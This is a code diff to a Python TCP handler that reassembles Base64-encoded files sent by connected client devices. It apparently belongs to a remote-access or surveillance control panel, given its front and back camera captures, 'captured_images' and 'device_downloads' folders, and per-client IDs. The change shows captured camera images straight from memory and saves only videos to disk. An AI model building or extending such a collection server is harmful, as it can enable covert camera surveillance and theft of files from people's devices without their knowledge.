@@ -63,17 +63,20 @@ def handle_tcp_data(raw_line, cid):
             elif 'END' in t:
                 fname = packet.get('file')
                 if fname and fname in file_transfers:
-                    folder = 'captured_images' if (fname.endswith(('.jpg','.png','.mp4'))) else 'device_downloads'
-                    path = os.path.join(folder, secure_filename(fname))
-                    with open(path, 'wb') as f:
-                        f.write(base64.b64decode("".join(file_transfers.pop(fname))))
+                    # Collect Base64 data from memory instead of saving to disk
+                    b64_data = "".join(file_transfers.pop(fname))
                     
-                    if fname.endswith('.mp4'): cd['media'].update({"last_vid": fname, "status": "done"})
+                    if fname.endswith('.mp4'):
+                         # For videos we still might need files, but for images we go direct
+                         folder = 'captured_images'
+                         path = os.path.join(folder, secure_filename(fname))
+                         with open(path, 'wb') as f: f.write(base64.b64decode(b64_data))
+                         cd['media'].update({"last_vid": fname, "status": "done"})
                     elif t == 'CAMERA_IMAGE_END' or fname.startswith(('back_pic','front_pic')):
-                        cd['media'].update({"last_img": fname, "status": "done"})
+                        cd['media'].update({"last_img": b64_data, "is_direct": True, "status": "done"})
                     else:
                         cd['media']['last_img'] = fname
-                    add_log(f"File Saved: {fname}")
+                    add_log(f"Data Received (Memory Mode): {fname}")
             
             add_log(f"Received {t} from {cid}")
     except Exception as e: add_log(f"Error parsing: {e}")
